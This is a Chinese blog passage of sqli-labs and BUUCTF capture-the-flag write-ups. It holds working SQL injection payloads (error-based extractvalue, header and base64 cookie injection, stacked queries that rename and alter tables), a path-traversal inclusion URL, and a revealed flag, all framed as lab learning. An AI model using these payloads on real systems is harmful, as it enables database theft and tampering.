class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这里显示的只有’USER’’CURRENT_CONNECTIONS’’TOTAL_CONNECTIONS’没有’id’’username’’password’,奇怪</p><h2 id="值-2"><a href="#值-2" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username)<span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>值这里竟然不报错…奇怪</p><hr><h1 id="les18-POST-Header-Injection-Uagent-field-Error-based"><a href="#les18-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="les18:POST-Header Injection-Uagent field-Error based"></a>les18:POST-Header Injection-Uagent field-Error based</h1><p>这又是一种船新的题目</p><p>一进场,如下:</p><img src="/2019/07/25/sqli-labs-master/18start.png"><hr><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="User-Agent头字段"><a href="#User-Agent头字段" class="headerlink" title="User-Agent头字段"></a>User-Agent头字段</h3><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP请求头字段，用于将创建请求的浏览器和用户代理名称等信息传送给服务器。</p><p><a href="https://blog.csdn.net/Eagle_pompom/article/details/89526180" target="_blank" rel="noopener">more info</a></p><h2 id="看语句"><a href="#看语句" class="headerlink" title="看语句"></a>看语句</h2><p>这次两个都是admin都是failed</p><img src="/2019/07/25/sqli-labs-master/18failed1.png"><p>试一下之前记得的Dumb</p><img src="/2019/07/25/sqli-labs-master/18Dumb.png" title="显示User-Agent信息"><p>放弃了这次猜不到了</p><p>看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line"></span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure><p>但是还有一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure><h2 id="库名-5"><a href="#库名-5" class="headerlink" title="库名"></a>库名</h2><p>用brupsuite抓包,在useragent后面加上:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1</span><br></pre></td></tr></table></figure><p>{&amp; asset_img 18db.png dbname&amp;}</p><h2 id="表名-4"><a href="#表名-4" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><blockquote><p>Truncated incorrect DOUBLE value: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0’</p></blockquote><p>库名能出来其他出不来</p><p>这就很难受</p><hr><h1 id="les19-POST-Header-Injection-Referer-Error-Based-string"><a href="#les19-POST-Header-Injection-Referer-Error-Based-string" class="headerlink" title="les19:POST-Header Injection- Referer- Error Based- string"></a>les19:POST-Header Injection- Referer- Error Based- string</h1><p><em>题目意思是头部referer处注入</em></p><p>一开始用户名及密码都用admin1来成功登录后,发现有referer显示</p><img src="/2019/07/25/sqli-labs-master/19admin1.png"><p>Referer:浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。</p><p>例如：Referer: <a href="http://192.168.85.145/sqli-labs-master/Less-19/" target="_blank" rel="noopener">http://192.168.85.145/sqli-labs-master/Less-19/</a></p><h2 id="库名-6"><a href="#库名-6" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,database(),0x7e)) and '1'='1</span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/19dbname.png" title="dbname"><h2 id="表名-5"><a href="#表名-5" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>这题跟les18很像,估计payload都是一样的,然而这题我也是只能爆出个库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><blockquote><p>版权声明：上面这个payload为CSDN博主「wkend」的原创，遵循CC 4.0 by-sa版权协议，转载附上原文出处链接及此声明。<br>原文链接：<a href="https://blog.csdn.net/qq_34444097/article/details/83043678" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/83043678</a></p></blockquote><p>我用他的payload还是爆不出来…</p><hr><h1 id="les20-POST-Cookie-Injection-Error-Based-string"><a href="#les20-POST-Cookie-Injection-Error-Based-string" class="headerlink" title="les20:POST-Cookie Injection- Error Based- string"></a>les20:POST-Cookie Injection- Error Based- string</h1><p>admin1走一波</p><img src="/2019/07/25/sqli-labs-master/20admin1.png"><h2 id="库名-7"><a href="#库名-7" class="headerlink" title="库名"></a>库名</h2><p>在抓包后forward到有cookie的地方后面加上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>其实用注释符#代替and ‘1’=’1也是可以的,只不过是前面两题用顺手了发现也行…</p><img src="/2019/07/25/sqli-labs-master/20dbname.png" title="dbname"><h2 id="表名-6"><a href="#表名-6" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20tables.png" title="tables"><h2 id="列-3"><a href="#列-3" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>发现显示不完整</p><p>于是不用group_concat,试着用limit一个一个爆出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20colum4.png" title="id"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20column5.png" title="username"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">5</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20column6.png" title="password"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">6</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20no.png"><h2 id="值-3"><a href="#值-3" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/20username.png"><p>也是显示不全  也可以用上面的方法一个一个爆</p><h1 id="les21-POST-Cookie-Injection-Error-Based-complex-string"><a href="#les21-POST-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="les21:POST-Cookie Injection- Error Based- complex - string"></a>les21:POST-Cookie Injection- Error Based- complex - string</h1><p>admin1操作及forward之后发现:</p><blockquote><p>Cookie: uname=YWRtaW4x</p></blockquote><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br></pre></td></tr></table></figure><p>是base64编码,找了一个网页工具验证</p><img src="/2019/07/25/sqli-labs-master/21base64.png"><p>验证成功,知道是base64之后就可以把payload放进去编码了</p><p>但是需要注意的是,还有一个地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>需要加上)来闭合</p><h2 id="库名-8"><a href="#库名-8" class="headerlink" title="库名"></a>库名</h2><p>在Cookie: uname=YWRtaW4x后面加上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw==</span><br></pre></td></tr></table></figure><p>奇怪的是,这样也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JyBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgYW5kICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>base64解码后:</p><blockquote><p>‘ and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘1’=’1</p></blockquote><p>这个没有用注释符#,用的是and ‘1’=’1</p><img src="/2019/07/25/sqli-labs-master/21dbname.png"><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他的也是一样操作,进行base64编码再ctrl-v到Cookie: uname=YWRtaW4x后面就行</p><h1 id="les22-POST-Cookie-Injection-Error-Based-Double-Quotes-string"><a href="#les22-POST-Cookie-Injection-Error-Based-Double-Quotes-string" class="headerlink" title="les22:POST-Cookie Injection- Error Based- Double Quotes - string"></a>les22:POST-Cookie Injection- Error Based- Double Quotes - string</h1><p>看了一下源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line"></span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>而les21的是没有cookee1的</p><p>这就是les22跟les21不同的地方</p><p>找到了不同点,可以开始注入了</p><h2 id="库名-9"><a href="#库名-9" class="headerlink" title="库名"></a>库名</h2><p>在Cookie: uname=YWRtaW4x后面加上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj</span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/22dbname.png"><p>les22竟然显示les21的图片…</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF记事本</title>
      <link href="/2019/07/16/buuctf/"/>
      <url>/2019/07/16/buuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="[Misc]"></a>[Misc]</h1><a id="more"></a><h2 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1.二维码"></a><strong>1.二维码</strong></h2><p>下载文件&gt;kali&gt;binwalk filename&gt;发现有压缩包&gt;binwalk -e filename提取压缩包&gt;解压得到flag</p><h2 id="2-N种解决方法"><a href="#2-N种解决方法" class="headerlink" title="2.N种解决方法"></a><strong>2.N种解决方法</strong></h2><p>直接扔到winhex拉到最后就得到flag</p><h2 id="3-金三胖"><a href="#3-金三胖" class="headerlink" title="3.金三胖"></a><strong>3.金三胖</strong></h2><p>扔到PS看图层显示</p><h2 id="4-LSB隐写"><a href="#4-LSB隐写" class="headerlink" title="4.LSB隐写"></a><strong>4.LSB隐写</strong></h2><p>-LSB全称leastsignificant bit,是一种基于图片最低有效位修改储存信息的隐写方法</p><p>-LSB隐写就是通过修改RGB颜色分量的最低位二进制（LSB）,来进行信息的储存,人眼看不出前后变化</p><p>用stegsolve打开图片后,看到alpha的全位空白,选择analyse&gt;extract preview,把RGB的0给勾上,右侧bit order选择LSB First,选择好后点击下方save bin(以二进制的形式保存),保存为图片格式即可得到二维码,扫一下就得到flag了</p><h2 id="5-镜子里的世界"><a href="#5-镜子里的世界" class="headerlink" title="5.镜子里的世界"></a><strong>5.镜子里的世界</strong></h2><p>这题依然是用stegsolve打开,发现alpha是空白的,选择analyse&gt;extract preview,把RGB的0都勾上,点击preview,上方窗口有一些数据,拉到最上方即可发现flag</p><h2 id="6-rar"><a href="#6-rar" class="headerlink" title="6.rar"></a><strong>6.rar</strong></h2><p>题目告诉我们是4位纯数字,用ARCHPR打开压缩包,选择口令长度为4,范围是所有数字,攻击类型为爆破,很快我们就得到flag</p><h2 id="7-文件中的秘密"><a href="#7-文件中的秘密" class="headerlink" title="7.文件中的秘密"></a><strong>7.文件中的秘密</strong></h2><p>flag真的存在文件中…将文件后缀改为txt打开即可得到flag</p><h2 id="8-看我回旋踢"><a href="#8-看我回旋踢" class="headerlink" title="8.看我回旋踢"></a><strong>8.看我回旋踢</strong></h2><p>这是一道ROT13的题,搜一个rot13编码解码的网页工具就可以了</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考<a href="https://www.qqxiuzi.cn/bianma/ascii.htm" target="_blank" rel="noopener">ASCII编码</a>。</p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="[Web]"></a>[Web]</h1><h2 id="1-WarmUp"><a href="#1-WarmUp" class="headerlink" title="1. WarmUp"></a>1. WarmUp</h2><p>打开后查看源码发现有<!--source.php-->,在url加上/source.php看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $\_page = mb\_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST\[<span class="string">'file'</span>\])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src="</span>https:<span class="comment">//i.loli.net/2018/11/01/5bdb0d93dc794.jpg" /&gt;";</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>mb_substr — 获取部分字符串(提取$page的第0到第mb_strpos个字符)</p></li><li><p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置(在$page中找出?首次出现的位置)</p></li><li><p>in_array — 检查数组中是否存在某个值($whitelist里面是否有$page)</p></li></ul><p><em>if</em>(<em>ina_​_rray</em>(_page, $whitelist)) {return true;}//这个函数连接上一个函数就是以问号为分割取出前面的字符串来判断是否存在包含的文件名中</p><p>$_page = urldecode($page);把$page进行url解码,因此在构造完payload之后要进行两次url编码</p><p><strong>因此代码大概意思为: checkFile函数$_page取file参数第一个问号之前的字段检查文件名是否在白名单内,然后对$page进行url解码之后再判断一次,当满足request[‘file’]不为空&amp;&amp;request[‘file’]是字符串&amp;&amp;checkfile函数返回true时,包含file文件</strong></p><p>且看见有[“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];</p><p>打开hint.php发现</p><p>flag not here, and flag in ffffllllaaaagggg</p><p>综上得到payload为:</p><p>file=source.php?/../../../../../../ffffllllaaaagggg</p><p>最终URL为<a href="http://web5.buuoj.cn/source.php?file=source.php%253f/../../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://web5.buuoj.cn/source.php?file=source.php%253f/../../../../../../ffffllllaaaagggg</a></p><p>flag{k9oct67wctkmbsdkhi32yiip74vsqlvu}</p><h2 id="2-随便注"><a href="#2-随便注" class="headerlink" title="2. 随便注"></a>2. 随便注</h2><img src="/2019/07/16/buuctf/21.png" title="姿势:1"><img src="/2019/07/16/buuctf/22.png" title="姿势:2"><img src="/2019/07/16/buuctf/23.png" title="姿势:3"><img src="/2019/07/16/buuctf/2orderby1.png"><p>姿势:1’ order by 1# </p><p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ order by 1 #‘(按照sql的语法#起注释作用所以#后面的单引号就被注释掉了)</strong></p><img src="/2019/07/16/buuctf/2orderby3.png"><p>姿势:1’ order by3#</p><p><strong>数字等于3报错，说明当前表只有两个字段并且只有2列</strong></p><img src="/2019/07/16/buuctf/2or1=1.png"><p>姿势:1’ or 1=1# </p><p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or 1=1 #’</strong></p><p>或者SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or’1’(这是sql万能密码其中之一)但是这题只有在法二的最后一步有用到</p><img src="/2019/07/16/buuctf/2filter.png"><p><strong>过滤了常用的sql命令</strong></p><p><strong>但是对堆叠注入(一次性执行多个语句)没有任何的检查，并且他这里面是将Mysql查询返回的结果以数组的形式返回，也就是说没有限制回显的多少。 也没有过滤rename</strong></p><p><strong>那么接下来就用show databases;和show tables;来看库和表</strong></p><p>姿势:1’;show databases;# </p><img src="/2019/07/16/buuctf/2showtables.png"><p>姿势:1’;show tables;# </p><p><strong>得到了6个数据库和2个表</strong></p><p><strong>那接下来就show一下表的结构</strong></p><img src="/2019/07/16/buuctf/2showcolumns.png" title="姿势:1" alt=";show columns from ` 1919810931114514 `#"><p><strong>纯数字的表需要用反引号(tab上面1左边esc下面的那个)来括住,可以看到flag在表1919810931114514中</strong></p><img src="/2019/07/16/buuctf/2table2.png" title="姿势:1" alt=";show columns from words;#"><img src="/2019/07/16/buuctf/2trybypass.png" title="尝试存储绕过"><p><strong>使用strstr和获取的，可以大小写绕过</strong></p><p><strong>看dalao的WP的payload为</strong></p><p>1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p><p>把a变量的十六进制扔到mysql里unhex一下:</p><img src="/2019/07/16/buuctf/2hex.png" title="unhex"><img src="/2019/07/16/buuctf/2hexinout.png"><img src="/2019/07/16/buuctf/2hex0x.png"><p>所以<br>0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>等价于<br>select * from `1919810931114514`</p><p><strong>法二:</strong>把表名改了,再1’ or 1=1#</p><p><strong>因为在php层面查询的时候固定语句一般是 select * from words where id = $id这种，数据库里面的变化php是管不到的,而且上面的过滤也没有过滤rename</strong></p><p>mysql中rename，语法为</p><p>rename table <code>当前表名</code> to <code>改后表名</code>;</p><p>但是表words中是存在列id，查询语句可能会根据该字段进行查询，而装有flag的表里面没有id字段，因此要用alter来添加，语法为</p><p>alter table <code>表名</code> add(字段名 字段类型 NULL)        #可为空</p><p>由于id的类型是int,所以alert可以写成这样子</p><p>alter table `1919810931114514` add(id int NULL)</p><p>最终dalao的payload为:</p><p><code>?inject=&#39;;alter table \</code>1919810931114514` add(id int NULL);rename table `words` to `tmp`;rename table `1919810931114514` to `words`;</p><p>也可以这样改(另一dalao的payload):</p><p>1’;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</p><h2 id="3-admin"><a href="#3-admin" class="headerlink" title="3. admin"></a>3. admin</h2><p>随手注册一个cxk</p><p>发现源码里面写着:you are not admin</p><img src="/2019/07/16/buuctf/adminsourcenotadmin.png"><p>打算注册一个admin</p><img src="/2019/07/16/buuctf/adminregisteradmin.png"><p>admin后面加空格</p><img src="/2019/07/16/buuctf/adminerror.png"><p>UnicodeError看来是个重点</p><p>看了大佬的WP才知道刚刚登录cxk进去之后的change password界面的源码有一个GitHub的地址,里面就是这道题的源码了</p><img src="/2019/07/16/buuctf/adminsourcechange.png"><p>源码里面不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>但是却放着python自带的lower()函数不用,引用了twisted模块的nodeprep.prepare函数<br>难道是它就喜欢多打from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep这么多的字母吗</p><p>问题就出在这里</p><blockquote><p>在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下nodeprep.prepare，找到一篇unicode安全的文章，<a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" 